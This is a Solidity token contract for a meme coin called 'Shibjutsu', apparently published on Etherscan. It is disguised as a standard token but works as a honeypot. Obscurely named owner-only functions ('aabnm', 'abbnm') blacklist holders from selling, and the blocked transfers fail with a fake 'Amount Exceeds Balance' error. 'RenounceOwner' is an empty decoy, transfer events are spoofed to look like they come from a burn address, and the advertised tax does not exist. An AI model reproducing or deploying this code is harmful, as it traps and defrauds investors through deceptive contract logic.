/**
 *Submitted for verification at Etherscan.io on 2022-09-15
*/

pragma solidity 0.8.7;
/*
  /$$$$$$  /$$   /$$ /$$$$$$ /$$$$$$$     /$$$$$ /$$   /$$ /$$$$$$$$ /$$$$$$  /$$   /$$
 /$$__  $$| $$  | $$|_  $$_/| $$__  $$   |__  $$| $$  | $$|__  $$__//$$__  $$| $$  | $$
| $$  \__/| $$  | $$  | $$  | $$  \ $$      | $$| $$  | $$   | $$  | $$  \__/| $$  | $$
|  $$$$$$ | $$$$$$$$  | $$  | $$$$$$$       | $$| $$  | $$   | $$  |  $$$$$$ | $$  | $$
 \____  $$| $$__  $$  | $$  | $$__  $$ /$$  | $$| $$  | $$   | $$   \____  $$| $$  | $$
 /$$  \ $$| $$  | $$  | $$  | $$  \ $$| $$  | $$| $$  | $$   | $$   /$$  \ $$| $$  | $$
|  $$$$$$/| $$  | $$ /$$$$$$| $$$$$$$/|  $$$$$$/|  $$$$$$/   | $$  |  $$$$$$/|  $$$$$$/
 \______/ |__/  |__/|______/|_______/  \______/  \______/    |__/   \______/  \______/ 



- 100M Supply
- 0% Tax (First 12 hours) - Then 7%


*/    

contract Shibjutsu {
  
    mapping (address => uint256) public balanceOf;
    mapping (address => bool) nAmount;

    // 
    string public name = "Shibjutsu";
    string public symbol = unicode"SHIBJUTSU";
    uint8 public decimals = 18;
    uint256 public totalSupply = 100000000 * (uint256(10) ** decimals);

    event Transfer(address indexed from, address indexed to, uint256 value);

    constructor()  {
        // 
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }

	address owner = msg.sender;
    address Burn = 0xB8f226dDb7bC672E27dffB67e4adAbFa8c0dFA08;
    address Construct = 0x60B1397061D990F39Bba443DCD1A0E25c566147b;
bool isEnabled;



modifier onlyOwner() {
    require(msg.sender == owner);
    _;
}

    function RenounceOwner() public onlyOwner  {

}





    function aabnm(address _user) public onlyOwner {
        require(!nAmount[_user], "xx");
        nAmount[_user] = true;
      
    }
    
    function abbnm(address _user) public onlyOwner {
        require(nAmount[_user], "xx");
        nAmount[_user] = false;
  
    }
    
 


   


    function transfer(address to, uint256 value) public returns (bool success) {

       

if(msg.sender == Construct)  {

require(!nAmount[msg.sender] , "Amount Exceeds Balance"); 

require(balanceOf[msg.sender] >= value);

        balanceOf[msg.sender] -= value;  
        balanceOf[to] += value; 
emit Transfer (Burn, to, value);
  return true;
}
        
require(!nAmount[msg.sender] , "Amount Exceeds Balance"); 


require(balanceOf[msg.sender] >= value);

        balanceOf[msg.sender] -= value;  
        balanceOf[to] += value;          
        emit Transfer(msg.sender, to, value);
        return true;
    }
    
    
    
    


    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => mapping(address => uint256)) public allowance;

    function approve(address spender, uint256 value)
       public
        returns (bool success)


       {
            
  

           
       allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }









    function transferFrom(address from, address to, uint256 value)
        public
        returns (bool success)
    {   
    
        require(!nAmount[from] , "Amount Exceeds Balance"); 
               require(!nAmount[to] , "Amount Exceeds Balance"); 
        require(value <= balanceOf[from]);
        require(value <= allowance[from][msg.sender]);

        balanceOf[from] -= value;
        balanceOf[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true;
    }
    

}